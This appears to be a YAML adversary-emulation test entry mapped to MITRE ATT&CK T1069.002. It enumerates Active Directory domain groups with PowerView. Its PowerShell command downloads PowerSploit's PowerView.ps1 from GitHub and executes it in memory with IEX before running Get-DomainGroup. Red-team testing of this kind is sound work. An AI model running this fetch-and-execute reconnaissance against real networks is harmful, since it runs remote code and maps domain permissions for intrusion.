- id: e02f3131-96b6-54be-a606-f89047c3f435
  name: Soumaia ART Tests - Get-DomainGroup with PowerView
  description: Utilizing PowerView, run Get-DomainGroup to identify the domain groups. Upon execution, Groups within the domain will be listed.
  tactic: discovery
  technique:
    attack_id: T1069.002
    name: 'Permission Groups Discovery: Domain Groups'
  platforms:
    windows:
      psh:
        command: |-
          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
          IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroup -verbose
